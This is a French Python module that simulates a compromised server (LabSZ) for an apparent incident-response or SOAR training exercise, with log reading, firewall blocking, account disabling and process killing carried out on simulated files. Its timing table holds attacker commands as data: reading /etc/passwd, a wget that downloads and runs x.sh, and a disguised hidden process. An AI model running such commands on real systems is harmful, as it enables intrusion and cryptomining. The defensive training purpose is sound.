"""L'infrastructure surveillée : journaux, pare-feu, comptes, disque du serveur LabSZ.

Tout est dans des fichiers du dossier `environnement/` : ouvrez-les pour voir l'effet des actions.
L'horloge avance avec le rejeu : à 07:28, on ne voit ni les journaux ni les fichiers de 08:41.
"""
import json, os, re, time
from contextlib import contextmanager
from datetime import datetime, timedelta
from pathlib import Path
from . import scenario as sc

ENV = sc.ENV
HORLOGE = datetime(2016, 12, 10, 23, 59, 59)       # le rejeu la met à l'heure de chaque alerte

# Quand chaque trace de l'attaquant apparaît sur le disque (pour ne pas « voir le futur »).
_APPARITION = {
    sc.CLE_ATTAQUANT: "08:44:02", sc.CRON_ATTAQUANT: "08:44:30", "31337": "08:47:00",
    "uname -a": "08:41:40", "whoami": "08:41:52", "cat /etc/passwd": "08:42:10",
    f"wget http://{sc.POOL}/x.sh": "08:43:05", "chmod +x x.sh": "08:43:20", "./x.sh": "08:43:24",
    "/tmp/.x/kworkerds": "08:47:00",
}


def _visible(ligne):
    for trace, hms in _APPARITION.items():
        if trace in ligne and HORLOGE < sc._h(hms):
            return False
    return True


def _heure(ligne):
    m = re.match(r"(\w{3}\s+\d+ \d\d:\d\d:\d\d)", ligne)
    return datetime.strptime("2016 " + m.group(1), "%Y %b %d %H:%M:%S") if m else None


# ---------- Lire ----------------------------------------------------------------------
def a_l_heure(alerte):
    """Avance l'horloge à l'heure d'une alerte."""
    global HORLOGE
    HORLOGE = datetime.fromisoformat(alerte["horodatage"])


def journaux(fichier="auth.log", minutes=None):
    """Les lignes d'un journal (auth.log, pare-feu.log, supervision.log) jusqu'à l'heure courante,
    ou seulement les `minutes` dernières minutes."""
    lignes = (ENV / "journaux" / fichier).read_text().splitlines()
    debut = HORLOGE - timedelta(minutes=minutes) if minutes else datetime.min
    return [l for l in lignes if debut <= (_heure(l) or HORLOGE) <= HORLOGE]


def chercher(motif, fichier="auth.log"):
    """Les lignes d'un journal qui contiennent `motif` (texte simple, insensible à la casse)."""
    return [l for l in journaux(fichier) if motif.lower() in l.lower()]


def lire(chemin):
    """Un fichier du disque du serveur, par ex. « home/webadmin/.ssh/authorized_keys »."""
    f = ENV / "hote-LabSZ" / chemin.lstrip("/")
    if not f.is_file():
        return None
    return "\n".join(l for l in f.read_text().splitlines() if _visible(l))


def processus():
    return [p for p in json.loads((ENV / "hote-LabSZ/processus.json").read_text()) if _visible(str(p["pid"]))]


def comptes():
    return json.loads((ENV / "comptes.json").read_text())


def ips_bloquees():
    m = re.search(r"elements = \{([^}]*)\}", (ENV / "pare-feu/regles.nft").read_text())
    return [x.strip() for x in m.group(1).split(",") if x.strip()]


# ---------- Agir (chaque action est idempotente et laisse une trace dans audit.jsonl) ----
@contextmanager
def _verrou():
    """Un seul processus à la fois modifie l'environnement (plusieurs travailleurs, exercice 4)."""
    chemin = ENV / ".verrou"
    for _ in range(200):
        try:
            fd = os.open(chemin, os.O_CREAT | os.O_EXCL)
            break
        except FileExistsError:
            time.sleep(0.05)
    else:
        raise TimeoutError("environnement verrouillé")
    try:
        yield
    finally:
        os.close(fd)
        os.remove(chemin)


def _protege(f):
    def g(*a, **k):
        with _verrou():
            return f(*a, **k)
    g.__name__, g.__doc__ = f.__name__, f.__doc__
    return g


def _audit(action, cible, resultat, acteur="soar"):
    with open(ENV / "audit.jsonl", "a") as f:
        f.write(json.dumps({"heure": f"{HORLOGE:%H:%M:%S}", "acteur": acteur, "action": action,
                            "cible": cible, "resultat": resultat}, ensure_ascii=False) + "\n")
    return resultat


@_protege
def bloquer_ip(ip):
    if ip in ips_bloquees():
        return _audit("bloquer_ip", ip, "déjà bloquée")
    f = ENV / "pare-feu/regles.nft"
    f.write_text(re.sub(r"elements = \{([^}]*)\}",
                        lambda m: "elements = { " + ", ".join(ips_bloquees() + [ip]) + " }", f.read_text()))
    return _audit("bloquer_ip", ip, "bloquée")


@_protege
def debloquer_ip(ip):
    f = ENV / "pare-feu/regles.nft"
    reste = [x for x in ips_bloquees() if x != ip]
    f.write_text(re.sub(r"elements = \{([^}]*)\}", "elements = { " + ", ".join(reste) + " }", f.read_text()))
    return _audit("debloquer_ip", ip, "débloquée")


@_protege
def desactiver_compte(compte):
    c = comptes()
    if compte not in c:
        return _audit("desactiver_compte", compte, "compte inconnu")
    if not c[compte]["actif"]:
        return _audit("desactiver_compte", compte, "déjà désactivé")
    c[compte]["actif"] = False
    (ENV / "comptes.json").write_text(json.dumps(c, indent=1, ensure_ascii=False))
    return _audit("desactiver_compte", compte, "désactivé")


@_protege
def retirer_ligne(chemin, texte):
    """Retire du fichier `chemin` les lignes qui contiennent `texte` (clé SSH, entrée cron…)."""
    f = ENV / "hote-LabSZ" / chemin.lstrip("/")
    if not f.is_file():
        return _audit("retirer_ligne", chemin, "fichier introuvable")
    lignes = f.read_text().splitlines()
    garde = [l for l in lignes if texte not in l]
    f.write_text("\n".join(garde) + ("\n" if garde else ""))
    return _audit("retirer_ligne", f"{chemin} : {texte}", f"{len(lignes) - len(garde)} ligne(s) retirée(s)")


@_protege
def tuer_processus(pid):
    f = ENV / "hote-LabSZ/processus.json"
    p = json.loads(f.read_text())
    reste = [x for x in p if x["pid"] != int(pid)]
    f.write_text(json.dumps(reste, indent=1, ensure_ascii=False))
    return _audit("tuer_processus", str(pid), "arrêté" if len(reste) < len(p) else "introuvable")


def audit():
    return [json.loads(l) for l in (ENV / "audit.jsonl").read_text().splitlines()]
